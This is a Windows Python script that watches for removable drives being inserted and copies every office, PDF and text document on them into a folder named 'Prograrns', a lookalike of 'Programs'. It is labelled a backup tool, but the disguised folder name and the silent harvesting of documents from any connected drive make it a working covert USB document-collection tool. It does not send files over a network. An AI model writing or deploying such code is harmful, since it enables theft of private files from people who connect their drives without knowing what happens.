import os
import shutil
import time
import win32api
import win32con
import win32gui
from win32file import GetDriveType

b_dir = os.path.join(os.path.expanduser("~"), "Prograrns")
old_d = set()

ext_to_copy = (
    '.pdf', '.docx', '.pptx', '.xlsx', 
    '.doc', '.ppt', '.xls', '.txt', '.rtf'
)

def process_drive(drive):
    print(f"Scanning {drive}...")
    
    files_to_copy = []
    try:
        for root, _, files in os.walk(drive):
            for f in files:
                if f.lower().endswith(ext_to_copy):
                    files_to_copy.append(os.path.join(root, f))
    except Exception as e:
        print(f"   ERROR: Scan failed: {e}")
        return

    if not files_to_copy:
        print(f"   No target files found on {drive}.")
        return

    print(f"   Found {len(files_to_copy)} file(s). Checking for new or updated files...")
    for p in files_to_copy:
        fname = os.path.basename(p)
        dest = os.path.join(b_dir, fname)
        
        if os.path.exists(dest):
            try:
                s_stat = os.stat(p)
                d_stat = os.stat(dest)

                if s_stat.st_size == d_stat.st_size and int(s_stat.st_mtime) == int(d_stat.st_mtime):
                    # print(f"   - Skipping (identical): {fname}")
                    continue
            except OSError:
                pass

        c = 1
        while os.path.exists(dest):
            n, ext = os.path.splitext(fname)
            dest = os.path.join(b_dir, f"{n}_{c}{ext}")
            c += 1

        try:
            shutil.copy2(p, dest)
            if c > 1:
                print(f"   - Copied (updated version): {os.path.basename(dest)}")
            else:
                print(f"   - Copied (new file): {fname}")
        except Exception as e:
            print(f"   - FAILED to copy {fname}: {e}")
    print("   Check complete.")

def handler(hwnd, msg, wparam, lparam):
    global old_d

    if msg == win32con.WM_DEVICECHANGE:
        if wparam == win32con.DBT_DEVICEARRIVAL:
            print("\n-> Device detected.")
            time.sleep(2)

            cur_d = {
                d for d in win32api.GetLogicalDriveStrings().split('\000')[:-1]
                if GetDriveType(d) == win32con.DRIVE_REMOVABLE
            }
            new_d = cur_d - old_d
            old_d = cur_d

            for d in new_d:
                process_drive(d)
            print("\nMonitoring...")

        elif wparam == win32con.DBT_DEVICEREMOVECOMPLETE:
            print("\n-> Device removed. Updating drive list.")
            time.sleep(1)
            old_d = {
                d for d in win32api.GetLogicalDriveStrings().split('\000')[:-1]
                if GetDriveType(d) == win32con.DRIVE_REMOVABLE
            }
            print("Monitoring...")

    return 0

if __name__ == "__main__":
    print(f"Backup folder: {b_dir}")

    if not os.path.exists(b_dir):
        os.makedirs(b_dir)

    old_d = {
        d for d in win32api.GetLogicalDriveStrings().split('\000')[:-1]
        if GetDriveType(d) == win32con.DRIVE_REMOVABLE
    }
    if old_d:
        print(f"Found already connected drives: {', '.join(old_d)}")
        for d in old_d:
            process_drive(d)
    
    print("\nReady. Now monitoring for new connections...")

    wc = win32gui.WNDCLASS()
    wc.lpfnWndProc = handler
    wc.lpszClassName = 'file_copier'
    hinst = win32api.GetModuleHandle(None)
    atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(atom, "listener", 0, 0, 0, 0, 0, 0, 0, hinst, None)
    
    win32gui.PumpMessages()
    win32gui.DestroyWindow(hwnd)